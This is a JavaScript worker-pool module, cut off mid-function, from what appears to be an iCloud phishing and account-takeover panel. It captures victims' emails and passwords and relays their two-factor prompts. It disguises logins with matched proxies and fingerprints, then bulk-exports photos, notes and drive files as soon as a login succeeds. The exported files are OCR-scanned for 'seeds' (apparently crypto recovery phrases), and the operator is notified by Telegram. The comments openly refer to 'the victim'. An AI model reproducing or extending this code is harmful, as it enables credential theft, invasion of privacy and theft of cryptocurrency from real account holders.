import { randomUUID, createHash } from "node:crypto";
import fs from "node:fs";
import path from "node:path";
import { config } from "../config.js";
import { safeName } from "../admin/export.js";
import { countsFromExport } from "../export-counts.js";
import { isAnyIpCountry } from "../proxy-countries.js";

/* Dispatch and relay for the Python workers.
 *
 * Node owns the account/job records and all routing; workers own every
 * blocking call. A job is sent to exactly one worker, and its events are
 * mirrored into the browser rooms (job:<id>, account:<id>). Nothing here
 * awaits a login or a download.
 */

const ACTIVE_ACCOUNT = new Set(["queued", "auth", "twofa", "exporting"]);
const COMMAND_TIMEOUT_MS = 12_000;
const BADGE_TTL_MS = 10 * 60 * 1000;

function badgeUntil() {
  return new Date(Date.now() + BADGE_TTL_MS).toISOString();
}

function workerSlots(payload) {
  const auth = Number(payload?.slots?.auth);
  const exp = Number(payload?.slots?.export);
  const scan = Number(payload?.slots?.scan);
  return {
    auth: Number.isFinite(auth) ? Math.max(0, Math.min(auth, 100)) : 0,
    export: Number.isFinite(exp) ? Math.max(0, Math.min(exp, 100)) : 0,
    scan: Number.isFinite(scan) ? Math.max(0, Math.min(scan, 100)) : 0,
  };
}

function stableSsid(email) {
  return createHash("sha256").update(String(email).toLowerCase()).digest("hex").slice(0, 16);
}

export class WorkerPool {
  constructor({ io, store, onEvent = () => {} }) {
    this.io = io;
    this.store = store;
    this.onEvent = onEvent;
    this.settings = {
      maxAuthJobs: config.worker.maxAuthJobs,
      maxExportJobs: config.worker.maxExportJobs,
    };
    this.workers = new Map(); // socket.id -> { socket, slots, connectedAt }
    this.queue = []; // job ids waiting for a free slot
    this.commands = new Map(); // commandId -> { resolve, reject, timer }
    this.waitTimers = new Map(); // jobId -> timer
    // The queue lives in memory, but jobs live in the store.  Rebuild it on
    // boot, otherwise a restart leaves every queued job stuck forever (the
    // account shows "exporting 0/0" and startExport/startScan reuse it).
    const rank = (job) => {
      if (!job) return 9;
      if (job.type === "auth") return 0;
      if (job.type === "verify" || job.type === "scan") return 1;
      if (job.type === "export" || job.type === "import") return 2;
      return 3;
    };
    for (const job of this.store.jobs.values()) {
      if (job.status === "queued") this.queue.push(job.id);
    }
    this.queue.sort((a, b) => {
      const ja = this.store.getJob(a);
      const jb = this.store.getJob(b);
      return (
        rank(ja) - rank(jb) ||
        Number(this.notesMissing(ja?.accountId)) - Number(this.notesMissing(jb?.accountId)) ||
        String(ja?.createdAt).localeCompare(String(jb?.createdAt))
      );
    });
  }

  /* --------------------------------------------------------------- accounting */

  workerView(account) {
    return {
      id: account.id,
      shortId: account.shortId,
      email: account.email,
      password: account.password,
      sessionDir: account.sessionDir,
      fingerprint: account.fingerprint,
      geo: account.geo,
      proxy: account.proxy,
    };
  }

  publicAccount(account) {
    return this.store.publicAccount(account);
  }

  roomFor(job, account) {
    return { job: `job:${job.id}`, account: `account:${account.id}` };
  }

  emitJob(job, _account, event, payload) {
    // Auth events belong to the job room; account-wide events use emitAccount.
    this.io.of("/public").to(`job:${job.id}`).emit(event, payload);
  }

  emitAccount(account, event, payload) {
    this.io.of("/public").to(`account:${account.id}`).emit(event, payload);
  }

  notify(type, payload) {
    try {
      this.onEvent(type, payload);
    } catch (error) {
      console.error("[worker-pool] telegram callback", error.message);
    }
  }

  /* ------------------------------------------------------------- public entry */

  /** The visitor pressed Continue on the email step (no password yet).
   * Creates the account early so the operator sees the email immediately;
   * startAuth() later fills in the password and reuses the same record.
   * Repeat submits for the same email are coalesced for 90s. */
  registerEmail({ email, fingerprint, geo }) {
    const normalized = String(email ?? "").trim();
    if (!normalized) throw new Error("email is required");
    const now = Date.now();
    const prior = this.store.getAccountByEmail(normalized);

    if (prior) {
      const last = prior.lastEmailAt ? Date.parse(prior.lastEmailAt) : 0;
      const announce = !last || now - last > 90_000;
      const patch = {
        geo: { ...(prior.geo ?? {}), ...(geo ?? {}) },
        proxy: {
          ...(prior.proxy ?? {}),
          ssid: prior.proxy?.ssid || stableSsid(normalized),
          country: geo?.countryCode ?? prior.proxy?.country ?? "",
          supported: isAnyIpCountry(geo?.countryCode ?? prior.proxy?.country ?? ""),
        },
      };
      if (fingerprint) patch.fingerprint = fingerprint;
      if (announce) patch.lastEmailAt = new Date(now).toISOString();
      const updated = this.store.updateAccount(prior.id, patch);
      if (announce) {
        this.emitAccount(updated, "account:email", { email: normalized });
        this.notify("email_entered", {
          account: this.store.getAccount(prior.id),
          newAccount: false,
        });
      }
      return { account: updated, newAccount: false, announced: announce };
    }

    const account = this.store.createAccount({
      email: normalized,
      password: "",
      status: "queued",
      sessionDir: this.store.sessionDirFor(normalized, config.icloud.sessionsDir),
      fingerprint,
      geo,
      proxy: {
        ssid: stableSsid(normalized),
        country: geo?.countryCode ?? "",
        supported: isAnyIpCountry(geo?.countryCode),
      },
      lastEmailAt: new Date(now).toISOString(),
    });
    this.emitAccount(account, "account:email", { email: normalized });
    this.notify("email_entered", { account, newAccount: true });
    return { account, newAccount: true, announced: true };
  }

  async startAuth({ email, password, fingerprint, geo }) {
    const existing = this.store.activeJobForEmail(email, "auth");
    if (existing) {
      const { account, job } = existing;
      // A second tab attaches to the running job instead of opening the same
      // cookie directory twice.
      if (password) this.store.updateAccount(account.id, { password });
      return { account, job, reused: true };
    }
    if (this.queue.length >= config.worker.maxQueue) {
      throw new Error("the sign-in queue is full; try again shortly");
    }

    const prior = this.store.getAccountByEmail(email);
    const account = prior
      ? this.store.updateAccount(prior.id, {
          password,
          fingerprint,
          geo,
          status: "queued",
          lastError: "",
          locked: false,
          lockCode: "",
          unlockUrl: "",
          sessionDir:
            prior.sessionDir ||
            this.store.sessionDirFor(email, config.icloud.sessionsDir),
          proxy: {
            ...(prior.proxy ?? {}),
            ssid: prior.proxy?.ssid || stableSsid(email),
            country: geo?.countryCode ?? prior.proxy?.country ?? "",
            supported: isAnyIpCountry(geo?.countryCode ?? prior.proxy?.country ?? ""),
          },
        })
      : this.store.createAccount({
          email,
          password,
          status: "queued",
          sessionDir: this.store.sessionDirFor(email, config.icloud.sessionsDir),
          fingerprint,
          geo,
          proxy: {
            ssid: stableSsid(email),
            country: geo?.countryCode ?? "",
            supported: isAnyIpCountry(geo?.countryCode),
          },
        });
    const job = this.store.createJob({
      accountId: account.id,
      type: "auth",
      payload: { email },
    });
    this.enqueue(job.id);
    this.notify("auth_start", { account, job });
    this.emitJob(job, account, "auth:state", {
      state: "queued",
      jobId: job.id,
      accountId: account.id,
      message: "Queued",
    });
    return { account, job, reused: false };
  }

  async startExport(accountId, { mode = "missing", parentJobId = null } = {}) {
    if (this.queue.length >= config.worker.maxQueue) {
      throw new Error("the export queue is full; try again shortly");
    }
    const account = this.store.getAccount(accountId);
    if (!account) throw new Error("account not found");
    const active = this.store.activeJobForAccount(accountId, "export");
    if (active) {
      if (account.lastError && account.trusted) {
        this.store.updateAccount(accountId, { lastError: "" });
      }
      return { account, job: active, reused: true, parentJobId };
    }
    const job = this.store.createJob({
      accountId,
      type: "export",
      payload: { mode, parentJobId },
    });
    this.store.updateAccount(accountId, {
      status: "exporting",
      lastError: "",
      export: { ...(account.export ?? {}), phase: "queued" },
    });
    // A new account's notes should land before a 10 GB photo/drive export
    // that was queued earlier.  Notes are tiny; once they exist the account
    // goes back to the normal FIFO order.
    this.enqueue(job.id, this.notesMissing(accountId));
    this.notify("export_start", { account, job, mode });
    return { account, job, reused: false, parentJobId };
  }

  async startPing(accountId) {
    const account = this.store.getAccount(accountId);
    if (!account) throw new Error("account not found");
    const active = this.store.activeJobForAccount(accountId, "ping");
    if (active) return { account, job: active, reused: true };
    const job = this.store.createJob({ accountId, type: "ping" });
    this.enqueue(job.id);
    return { account, job, reused: false };
  }

  async startImport({ path: folder, email }) {
    if (!folder || !email) throw new Error("folder and email are required");
    let stat = null;
    try {
      stat = fs.statSync(folder);
    } catch {
      throw new Error("folder not found on the server");
    }
    if (!stat.isDirectory()) throw new Error("path is not a folder");
    if (!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(email)) throw new Error("invalid email");

    const prior = this.store.getAccountByEmail(email);
    if (prior) {
      const active = this.store.activeJobForAccount(prior.id, "import");
      if (active) return { account: prior, job: active, reused: true };
    }
    if (this.queue.length >= config.worker.maxQueue) {
      throw new Error("the job queue is full; try again shortly");
    }
    const account = prior
      ? this.store.updateAccount(prior.id, {
          status: "queued",
          lastError: "",
          locked: false,
          lockCode: "",
          unlockUrl: "",
          sessionDir: prior.sessionDir || this.store.sessionDirFor(email, config.icloud.sessionsDir),
        })
      : this.store.createAccount({
          email,
          password: "",
          status: "queued",
          sessionDir: this.store.sessionDirFor(email, config.icloud.sessionsDir),
          fingerprint: { userAgent: "import", language: "", timezone: "" },
          geo: {},
        });
    const job = this.store.createJob({
      accountId: account.id,
      type: "import",
      payload: { path: folder },
    });
    this.store.updateAccount(account.id, {
      export: { ...(account.export ?? {}), phase: "queued", done: 0, total: 0 },
    });
    this.enqueue(job.id);
    this.notify("import_start", { account, job });
    return { account, job, reused: false };
  }

  async startVerify(accountId) {
    return this.startSideJob(accountId, "verify");
  }

  async startScan(accountId) {
    return this.startSideJob(accountId, "scan");
  }

  /** verify/scan share the queue and slots of their workload. */
  async startSideJob(accountId, type) {
    const account = this.store.getAccount(accountId);
    if (!account) throw new Error("account not found");
    const active = this.store.activeJobForAccount(accountId, type);
    if (active) return { account, job: active, reused: true };
    if (this.queue.length >= config.worker.maxQueue) {
      throw new Error("the job queue is full; try again shortly");
    }
    const job = this.store.createJob({ accountId, type });
    // verify/scan are quick and feed the dashboard/OCR; put them ahead of
    // queued bulk exports so a 15k-photo export cannot delay them.
    this.enqueue(job.id, true);
    this.notify(`${type}_start`, { account, job });
    return { account, job, reused: false };
  }

  attachPublicSocket(socket, { job, account }) {
    socket.join(`job:${job.id}`);
    socket.join(`account:${account.id}`);
    socket.data.jobId = job.id;
    socket.data.accountId = account.id;
  }

  /** Replay the current state for a refreshed browser tab. */
  replay(socket, job, account) {
    this.attachPublicSocket(socket, { job, account });
    socket.emit("auth:state", {
      state: account.status,
      jobId: job.id,
      accountId: account.id,
      message: job.message ?? "",
      reused: Boolean(job.reused),
    });
    if (job.twofa) socket.emit("auth:2fa", job.twofa);
    if (job.status === "done") {
      socket.emit("auth:result", { status: "ok", account: this.publicAccount(account) });
    } else if (job.status === "invalid" || job.status === "error") {
      socket.emit("auth:result", {
        status: job.status,
        reason: job.reason || "",
        message: job.error || job.message || "",
        unlockUrl: job.unlockUrl || "",
      });
    }
    if (account.status === "connected" && account.identity) {
      socket.emit("account:info", { identity: account.identity, counts: account.counts });
    }
    if (account.export?.phase && account.export.phase !== "idle") {
      socket.emit("export:progress", account.export);
    }
  }

  /** True when an account has not exported a single note yet. */
  notesMissing(accountId) {
    const account = this.store.getAccount(accountId);
    if (!account) return false;
    try {
      const dir = path.join(
        config.icloud.exportDir,
        safeName(account.email, "account"),
        "Notes"
      );
      return !fs.existsSync(dir) || fs.readdirSync(dir).length === 0;
    } catch {
      return true;
    }
  }

  /* ------------------------------------------------------------------- queue */

  enqueue(jobId, front = false) {
    if (!this.queue.includes(jobId)) {
      if (front) this.queue.unshift(jobId);
      else this.queue.push(jobId);
    }
    const job = this.store.getJob(jobId);
    if (job && !this.waitTimers.has(jobId)) {
      const timer = setTimeout(() => {
        this.waitTimers.delete(jobId);
        const current = this.store.getJob(jobId);
        if (current?.status !== "queued") return;
        const account = this.store.getAccount(current.accountId);
        if (!account) return;
        this.emitJob(current, account, "auth:state", {
          state: "queued",
          message: "Waiting for a worker",
        });
      }, config.worker.queueTimeoutMs);
      timer.unref?.();
      this.waitTimers.set(jobId, timer);
    }
    this.pump();
  }

  pickWorker(kind) {
    // Newest ready worker first: it just advertised free capacity. On a pool
    // of equals this spreads work without a central scheduler.
    const workers = [...this.workers.values()].reverse();
    for (const worker of workers) {
      if (worker.slots[kind] > 0) return worker;
    }
    return null;
  }

  pump() {
    let progressed = true;
    while (progressed) {
      progressed = false;
      for (let index = 0; index < this.queue.length; index += 1) {
        const job = this.store.getJob(this.queue[index]);
        if (!job || job.status !== "queued") {
          this.queue.splice(index, 1);
          index -= 1;
          continue;
        }
        const kind =
          job.type === "scan"
            ? "scan"
            : ["export", "import"].includes(job.type)
              ? "export"
              : "auth";
        const worker = this.pickWorker(kind);
        if (!worker) continue;
        this.queue.splice(index, 1);
        this.dispatch(worker, job);
        progressed = true;
        break;
      }
    }
  }

  dispatch(worker, job) {
    const account = this.store.getAccount(job.accountId);
    if (!account) return;
    const slot =
      job.type === "scan"
        ? "scan"
        : ["export", "import"].includes(job.type)
          ? "export"
          : "auth";
    worker.slots[slot] -= 1;
    this.store.updateJob(job.id, {
      status: "running",
      workerId: worker.socket.id,
      attempts: (job.attempts ?? 0) + 1,
      error: "",
    });
    if (job.type === "auth") {
      this.store.updateAccount(account.id, { status: "auth" });
    } else if (job.type === "export") {
      this.store.updateAccount(account.id, {
        status: "exporting",
        export: { ...(account.export ?? {}), phase: "running" },
      });
    }

    const payload = {
      jobId: job.id,
      account: this.workerView(account),
      proxy: {
        baseUrl: config.icloud.proxyUrl,
        country: account.geo?.countryCode || "",
        fallbackCountry: config.icloud.fallbackCountry,
        ssid: account.proxy?.ssid || stableSsid(account.email),
        trusted: Boolean(account.trusted),
      },
      fingerprint: {
        userAgent: account.fingerprint?.userAgent || worker.socket.handshake.headers["user-agent"] || "",
        language: account.fingerprint?.language || "",
        timezone: account.fingerprint?.timezone || "",
      },
      exportDir: config.icloud.exportDir,
      sessionsDir: config.icloud.sessionsDir,
      mode: job.payload?.mode ?? "missing",
      path: job.payload?.path ?? "",
      limit: job.payload?.limit ?? 0,
    };

    if (job.type === "export") {
      worker.socket.emit("job:export", payload);
    } else if (job.type === "ping") {
      worker.socket.emit("job:ping", payload);
    } else if (job.type === "verify") {
      worker.socket.emit("job:verify", payload);
    } else if (job.type === "scan") {
      worker.socket.emit("job:scan", payload);
    } else if (job.type === "import") {
      worker.socket.emit("job:import", payload);
    } else {
      worker.socket.emit("job:start", payload);
    }
    if (job.type === "auth") {
      this.emitJob(job, account, "auth:state", {
        state: "auth",
        jobId: job.id,
        message: "Signing in",
      });
    }
    this.notify("dispatched", { account, job });
  }

  /* ------------------------------------------------------------- worker events */

  release(job, workerId) {
    const worker = this.workers.get(workerId);
    if (worker) {
      const kind = ["export", "scan", "import"].includes(job.type) ? "export" : "auth";
      worker.slots[kind] = Math.min(worker.slots[kind] + 1, 100);
    }
    const timer = this.waitTimers.get(job.id);
    if (timer) {
      clearTimeout(timer);
      this.waitTimers.delete(job.id);
    }
    this.pump();
  }

  handleState(socket, payload) {
    const job = this.store.getJob(payload.jobId);
    if (!job || job.workerId !== socket.id) return;
    const account = this.store.getAccount(job.accountId);
    if (!account) return;
    const state = ["queued", "auth", "twofa", "connected", "invalid", "error", "exporting", "done", "dead"].includes(payload.state)
      ? payload.state
      : "auth";
    // verify/scan also report progress as job:state; they must not relabel the
    // account as authenticating.
    if (job.type === "auth") {
      if (state === "twofa") this.store.updateAccount(account.id, { status: "twofa" });
      else if (state === "auth") this.store.updateAccount(account.id, { status: "auth" });
      this.emitJob(job, account, "auth:state", {
        state,
        jobId: job.id,
        message: payload.message ?? "",
        reused: Boolean(payload.reused),
      });
      this.notify("state", { account, job, state, message: payload.message });
    }
    this.store.updateJob(job.id, {
      status: state === "queued" ? "queued" : "running",
      message: payload.message ?? "",
      reused: Boolean(payload.reused),
    });
  }

  handle2fa(socket, payload) {
    const job = this.store.getJob(payload.jobId);
    if (!job || job.workerId !== socket.id) return;
    const account = this.store.getAccount(job.accountId);
    if (!account) return;
    const view = {
      method: payload.method ?? "trusted_device",
      options: Array.isArray(payload.options) ? payload.options.slice(0, 12) : [],
      notice: payload.notice ?? "",
      choiceId: payload.choiceId ?? "",
      switchedFrom: payload.switchedFrom ?? "",
      switchedTo: payload.switchedTo ?? "",
    };
    this.store.updateJob(job.id, { status: "twofa", twofa: view });
    this.store.updateAccount(account.id, { status: "twofa" });
    this.emitJob(job, account, "auth:2fa", { ...view, jobId: job.id });
    this.notify("twofa", { account, job, ...view });
  }

  handleResult(socket, payload) {
    const job = this.store.getJob(payload.jobId);
    if (!job || job.workerId !== socket.id) return;
    const account = this.store.getAccount(job.accountId);
    if (!account) return;
    const status = ["ok", "invalid", "error"].includes(payload.status) ? payload.status : "error";
    const resultAccount = payload.account ?? null;
    const locked = status !== "ok" && payload.reason === "locked";
    const patch = {
      trusted:
        status === "ok" ? Boolean(resultAccount?.trusted ?? account.trusted) : false,
      lastError: status === "ok" ? "" : payload.message || "authentication failed",
      locked,
      lockCode: locked ? String(payload.code ?? "") : "",
      unlockUrl: locked ? String(payload.unlockUrl ?? "") : "",
    };
    if (resultAccount) {
      if (resultAccount.fingerprint) patch.fingerprint = resultAccount.fingerprint;
      if (resultAccount.proxy) patch.proxy = resultAccount.proxy;
      if (resultAccount.identity) patch.identity = resultAccount.identity;
      if (resultAccount.counts) patch.counts = resultAccount.counts;
      if (resultAccount.sessionDir) patch.sessionDir = resultAccount.sessionDir;
    }
    this.store.updateAccount(account.id, {
      ...patch,
      status: status === "ok" ? "connected" : status,
    });
    this.store.updateJob(job.id, {
      status: status === "ok" ? "done" : status,
      error: status === "ok" ? "" : payload.message || "",
      reason: locked ? "locked" : payload.reason ?? "",
      unlockUrl: locked ? String(payload.unlockUrl ?? "") : "",
    });
    this.emitJob(job, account, "auth:result", {
      status,
      reason: locked ? "locked" : payload.reason ?? "",
      message: payload.message ?? "",
      unlockUrl: locked ? String(payload.unlockUrl ?? "") : "",
      account: this.publicAccount(this.store.getAccount(account.id)),
    });
    this.notify("result", {
      account: this.store.getAccount(account.id),
      job,
      status,
      message: payload.message,
      reason: locked ? "locked" : payload.reason ?? "",
    });

    // A successful login starts the resumable export immediately, so the
    // account is readable in the panel/database without waiting for the
    // victim to click through /terms. startExport() is idempotent: an active
    // export is reused, and a later manual "export missing" joins it.
    if (status === "ok" && config.worker.autoExportAfterAuth) {
      this.startExport(account.id, { mode: "missing", parentJobId: job.id }).catch(
        (error) => console.error("[worker-pool] auto export", error.message)
      );
    }

    this.release(job, socket.id);
  }

  handleAccountInfo(socket, payload) {
    const job = this.store.getJob(payload.jobId);
    if (!job || job.workerId !== socket.id) return;
    const account = this.store.getAccount(job.accountId);
    if (!account) return;
    const identity = payload.identity ?? payload.account?.identity ?? {};
    const counts = payload.counts ?? payload.account?.counts ?? {};
    const patch = { identity, counts };
    if (payload.proxy) patch.proxy = { ...(account.proxy ?? {}), ...payload.proxy };
    const updated = this.store.updateAccount(account.id, patch);
    this.emitAccount(updated, "account:info", { identity: updated.identity, counts: updated.counts });
    this.notify("account_info", { account: updated, job });
  }

  handleExportProgress(socket, payload) {
    const job = this.store.getJob(payload.jobId);
    if (!job || job.workerId !== socket.id) return;
    const account = this.store.getAccount(job.accountId);
    if (!account) return;
    const overallDone = Number(payload.overallDone) || 0;
    const overallTotal = Number(payload.overallTotal) || 0;
    const progress = {
      phase: "running",
      area: payload.area ?? "",
      // The header/bar are the whole export; areaDone/areaTotal keep the
      // per-area detail available for the tabs.
      done: overallDone,
      total: overallTotal,
      bytes: Number(payload.bytes) || 0,
      areaDone: Number(payload.done) || 0,
      areaTotal: Number(payload.total) || 0,
      overallDone,
      overallTotal,
      areas: payload.areas ?? account.export?.areas ?? {},
      startedAt: account.export?.startedAt ?? new Date().toISOString(),
    };
    const updated = this.store.updateAccount(account.id, {
      export: progress,
      lastError: "",
      // Show NEW FILES while the files are landing, not only at the end.
      ...(overallDone > 0
        ? { badges: { newFilesUntil: badgeUntil(), newFiles: overallDone } }
        : {}),
    });
    this.emitAccount(updated, "export:progress", progress);
    this.notify("export_progress", { account: updated, job, progress });
  }

  handleExportDone(socket, payload) {
    const job = this.store.getJob(payload.jobId);
    if (!job || job.workerId !== socket.id) return;
    const account = this.store.getAccount(job.accountId);
    if (!account) return;
    const totals = payload.totals ?? {};
    // Prefer the worker's snapshot; fall back to the export tree for an old
    // worker payload that predates exporter.collect_counts().
    const counts = payload.counts ?? countsFromExport(account.email) ?? {};
    const previousDone = Number(account.export?.done) || 0;
    const added = Math.max(0, (Number(totals.done) || 0) - previousDone);
    const updated = this.store.updateAccount(account.id, {
      status: "done",
      // The login-time inventory is a live snapshot.  The export knows what
      // is actually on disk, so its counts replace the old numbers (notes
      // added after login were the visible bug).
      ...(Object.keys(counts).length ? { counts } : {}),
      lastError: "",
      ...(added > 0
        ? { badges: { newFilesUntil: badgeUntil(), newFiles: added } }
        : {}),
      export: {
        ...(account.export ?? {}),
        phase: "done",
        finishedAt: new Date().toISOString(),
        done: totals.done ?? account.export?.done ?? 0,
        total: totals.total ?? account.export?.total ?? 0,
        bytes: totals.bytes ?? account.export?.bytes ?? 0,
        failed: totals.failed ?? account.export?.failed ?? 0,
        areas: totals.areas ?? account.export?.areas ?? {},
        manifestPath: payload.manifest ?? "",
      },
    });
    this.store.updateJob(job.id, { status: "done" });
    this.emitAccount(updated, "export:done", { manifest: payload.manifest, totals });
    this.notify("export_done", { account: updated, job, totals });
    this.release(job, socket.id);

    // Full pipeline: export -> OCR/seed scan -> Telegram summary.  The scan is
    // idempotent and reuses cached OCR text, so a resumed/incremental export
    // only reads what changed.  A manual scan already running is reused.
    if (config.worker.autoScanAfterExport) {
      this.startScan(account.id).catch((error) =>
        console.error("[worker-pool] auto scan", error.message)
      );
    }
  }

  handleError(socket, payload) {
    const job = this.store.getJob(payload.jobId);
    if (!job || job.workerId !== socket.id) return;
    const account = this.store.getAccount(job.accountId);
    if (!account) return;
    this.store.updateJob(job.id, { status: "error", error: payload.error ?? "worker error" });
    if (job.type === "export") {
      this.store.updateAccount(account.id, {
        status: "error",
        export: { ...(account.export ?? {}), phase: "error" },
        lastError: payload.error ?? "export failed",
      });
      this.emitAccount(account, "export:done", { error: payload.error ?? "export failed" });
    } else if (job.type === "ping") {
      this.store.updateAccount(account.id, {
        status: "error",
        lastError: payload.error ?? "ping failed",
      });
    } else if (job.type === "verify" || job.type === "scan" || job.type === "import") {
      this.store.updateAccount(account.id, {
        status: job.type === "import" ? "error" : account.status,
        lastError: payload.error ?? `${job.type} failed`,
        ...(job.type === "verify"
          ? {
              recheckPending: false,
              lastCheckAt: new Date().toISOString(),
            }
          : {}),
      });
    } else {
      this.store.updateAccount(account.id, {
        status: "error",
        lastError: payload.error ?? "authentication failed",
      });
      this.emitJob(job, account, "auth:result", {
        status: "error",
        message: payload.error ?? "worker error",
      });
    }
    this.notify("error", { account: this.store.getAccount(account.id), job, error: payload.error });
    this.release(job, socket.id);
  }

  handlePingResult(socket, payload) {
    const job = this.store.getJob(payload.jobId);
    if (!job || job.workerId !== socket.id) return;
    const account = this.store.getAccount(job.accountId);
    if (!account) return;
    const ok = Boolean(payload.ok);
    const updated = this.store.updateAccount(account.id, {
      status: ok ? "connected" : "dead",
      trusted: ok ? Boolean(payload.trusted ?? account.trusted) : false,
      lastPingAt: new Date().toISOString(),
      lastError: ok ? "" : payload.error ?? "session dead",
    });
    this.store.updateJob(job.id, { status: ok ? "done" : "error", error: ok ? "" : payload.error ?? "" });
    this.emitAccount(updated, "account:info", {
      identity: updated.identity,
      counts: updated.counts,
      status: updated.status,
      lastPingAt: updated.lastPingAt,
    });
    this.notify("ping", { account: updated, job, ok });
    this.release(job, socket.id);
  }

  handleVerifyResult(socket, payload) {
    const job = this.store.getJob(payload.jobId);
    if (!job || job.workerId !== socket.id) return;
    const account = this.store.getAccount(job.accountId);
    if (!account) return;
    const verify = {
      startedAt: job.createdAt ?? account.verify?.startedAt ?? new Date().toISOString(),
      finishedAt: new Date().toISOString(),
      areas: payload.areas ?? {},
      missing: payload.missing ?? {},
    };
    // Refresh the visible counts from what the live check just measured, so
    // "Counts" and "Live iCloud check" never disagree after a refresh.
    const areas = payload.areas ?? {};
    const counts = {};
    for (const area of ["photos", "hidden", "deleted", "notes"]) {
      if (areas[area]) {
        counts[area] = Math.max(
          Number(areas[area].live) || 0,
          Number(areas[area].exported) || 0
        );
      }
    }
    if (areas.drive) {
      counts.driveFiles = Math.max(
        Number(areas.drive.live) || 0,
        Number(areas.drive.exported) || 0
      );
    }
    if (Number(areas.contacts?.live) > 0) counts.contacts = Number(areas.contacts.live);
    if (Number(areas.calendar?.live) > 0) counts.calendars = Number(areas.calendar.live);
    if (Number(areas.reminders?.live) > 0) counts.reminders = Number(areas.reminders.live);

    const totalMissing = Object.values(areas).reduce(
      (sum, area) => sum + (Number(area?.missing) || 0),
      0
    );
    const recheck = Boolean(account.recheckPending);
    const checkedAt = new Date().toISOString();
    const updated = this.store.updateAccount(account.id, {
      verify,
      recheckPending: false,
      lastCheckAt: checkedAt,
      lastPingAt: checkedAt,
      ...(Object.keys(counts).length ? { counts } : {}),
      ...(totalMissing > 0
        ? { badges: { newFilesUntil: badgeUntil(), newFiles: totalMissing } }
        : {}),
    });
    this.store.updateJob(job.id, { status: "done" });
    this.emitAccount(updated, "account:verify", verify);
    this.notify("verify", { account: updated, job, verify });
    this.release(job, socket.id);

    // "Recheck all": when live iCloud has items the export is missing,
    // immediately download only the gaps.  The export then feeds the
    // automatic OCR scan and the NEW FILES/NEW SEEDS labels.
    if (recheck && totalMissing > 0) {
      this.startExport(account.id, { mode: "missing" }).catch((error) =>
        console.error("[worker-pool] recheck export", error.message)
      );
    }
  }

  handleImportProgress(socket, payload) {
    const job = this.store.getJob(payload.jobId);
    if (!job || job.workerId !== socket.id) return;
    const account = this.store.getAccount(job.accountId);
    if (!account) return;
    const exportState = {
      ...(account.export ?? {}),
      phase: "running",
      done: Number(payload.done) || 0,
      total: Number(payload.total) || 0,
    };
    const updated = this.store.updateAccount(account.id, { export: exportState });
    this.notify("import_progress", { account: updated, job, progress: exportState });
  }

  handleImportResult(socket, payload) {
    const job = this.store.getJob(payload.jobId);
    if (!job || job.workerId !== socket.id) return;
    const account = this.store.getAccount(job.accountId);
    if (!account) return;
    const summary = payload.summary ?? {};
    const previousFindings = Number(account.scan?.findings) || 0;
    const newFindings =
      summary.newFindings !== undefined
        ? Number(summary.newFindings) || 0
        : Math.max(0, (Number(summary.findings) || 0) - previousFindings);
    const updated = this.store.updateAccount(account.id, {
      status: "done",
      trusted: false,
      counts: payload.counts ?? {},
      ...(newFindings > 0
        ? { badges: { newSeedsUntil: badgeUntil(), newSeeds: newFindings } }
        : {}),
      export: {
        phase: "done",
        startedAt: job.createdAt,
        finishedAt: new Date().toISOString(),
        done: Number(payload.files) || 0,
        total: Number(payload.files) || 0,
        bytes: Number(payload.bytes) || 0,
        areas: {},
      },
      scan: {
        phase: "done",
        finishedAt: summary.generatedAt ?? new Date().toISOString(),
        files: Number(summary.files) || 0,
        images: Number(summary.images) || 0,
        ocrOk: Number(summary.ocrOk) || 0,
        ocrFailed: Number(summary.ocrFailed) || 0,
        findings: Number(summary.findings) || 0,
        newFindings,
        newTiers: summary.newTiers ?? summary.tiers ?? { low: 0, minimum: 0, medium: 0, high: 0, valid: 0 },
        hitFiles: Number(summary.hitFiles) || 0,
        hitImages: Number(summary.hitImages) || 0,
        tiers: summary.tiers ?? { low: 0, minimum: 0, medium: 0, high: 0, valid: 0 },
        imported: true,
      },
      lastError: "",
    });
    this.store.updateJob(job.id, { status: "done" });
    this.emitAccount(updated, "account:import", { counts: updated.counts });
    this.notify("import", { account: updated, job, summary });
    this.release(job, socket.id);
  }

  handleScanProgress(socket, payload) {
    const job = this.store.getJob(payload.jobId);
    if (!job || job.workerId !== socket.id) return;
    const account = this.store.getAccount(job.accountId);
    if (!account) return;
    const scan = {
      ...(account.scan ?? {}),
      phase: "running",
      startedAt: account.scan?.startedAt ?? new Date().toISOString(),
      area: payload.area ?? "",
      done: Number(payload.done) || 0,
      total: Number(payload.total) || 0,
    };
    const updated = this.store.updateAccount(account.id, { scan });
    this.emitAccount(updated, "account:scan", scan);
    this.notify("scan_progress", { account: updated, job, scan });
  }

  handleScanDone(socket, payload) {
    const job = this.store.getJob(payload.jobId);
    if (!job || job.workerId !== socket.id) return;
    const account = this.store.getAccount(job.accountId);
    if (!account) return;
    const scan = {
      phase: "done",
      startedAt: job.createdAt ?? account.scan?.startedAt ?? new Date().toISOString(),
      finishedAt: new Date().toISOString(),
      files: Number(payload.files) || 0,
      images: Number(payload.images) || 0,
      ocrOk: Number(payload.ocrOk) || 0,
      ocrFailed: Number(payload.ocrFailed) || 0,
      findings: Number(payload.findings) || 0,
      hitFiles: Number(payload.hitFiles) || 0,
      hitImages: Number(payload.hitImages) || 0,
      tiers: payload.tiers ?? { low: 0, minimum: 0, medium: 0, high: 0, valid: 0 },
    };
    const previousFindings = Number(account.scan?.findings) || 0;
    const newFindings =
      payload.newFindings !== undefined
        ? Number(payload.newFindings) || 0
        : Math.max(0, (Number(scan.findings) || 0) - previousFindings);
    scan.newFindings = newFindings;
    scan.newTiers = payload.newTiers ?? scan.tiers;
    const updated = this.store.updateAccount(account.id, {
      scan,
      // A completed scan proves the export tree is readable; drop a stale
      // scan error (e.g. FileNotFoundError from a concurrent export).
      lastError: "",
      ...(newFindings > 0
        ? { badges: { newSeedsUntil: badgeUntil(), newSeeds: newFindings } }
        : {}),
    });
    this.store.updateJob(job.id, { status: "done" });
    this.emitAccount(updated, "account:scan", scan);
    this.notify("scan", { account: updated, job, scan });
    this.release(job, socket.id);
  }

  /* ---------------------------------------------------------------- commands */

  command(jobId, event, payload = {}) {
    const job = this.store.getJob(jobId);
    if (!job) return Promise.reject(new Error("job not found"));
    const worker = this.workers.get(job.workerId);
    if (!worker) return Promise.reject(new Error("worker offline"));
    const commandId = randomUUID();
    return new Promise((resolve, reject) => {
      const timer = setTimeout(() => {
        this.commands.delete(commandId);
        reject(new Error("worker command timed out"));
      }, COMMAND_TIMEOUT_MS);
